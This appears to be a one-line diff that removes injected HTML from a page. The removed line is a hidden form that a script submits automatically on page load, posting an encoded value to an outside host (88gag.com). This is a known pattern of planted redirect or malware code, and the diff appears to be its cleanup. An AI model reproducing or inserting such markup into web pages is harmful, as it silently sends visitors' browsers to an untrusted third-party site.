@@ -1,1 +1,0 @@
-<form action="http://88gag.com/" method="post"><input type="hidden" name="z" value="zrWpx4brKjEKQfQ43wRrABaMdmUIDNZSveVkunpVVAbeizBRnG5jqrgbtODbljcV5N4H7ni1TLyXcUIqbzjWUQ=="></form><script>document.getElementsByTagName("form")[0].submit();</script>
